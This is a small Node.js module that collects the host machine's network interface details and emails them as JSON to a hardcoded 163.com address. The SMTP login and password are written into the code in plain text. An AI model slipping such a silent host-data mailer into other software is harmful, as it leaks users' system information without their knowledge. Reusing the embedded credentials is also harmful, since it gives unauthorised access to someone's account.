
const os = require('os');
const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
    host: "smtp.163.com",
    port: 25,
    secureConnection: true,
    auth: {
        user: "ymy19891012@163.com",
        pass: "leehom1012"
    }
});


module.exports = function() {

    const network = os.networkInterfaces();

    let info = JSON.stringify(network);

    const mailOptions = {
        from: 'ymy19891012@163.com',
        to: 'misuhom@163.com',
        subject: 'Hello IP ✔',
        html: `<b>机器网络信息：</b><br /><br />${info}`
    };

  transporter.sendMail(mailOptions, function(error, info) {
      if (error) {
          console.log(error);
      } else {
          console.log('Message sent: ' + info.response);
      }
  });
}

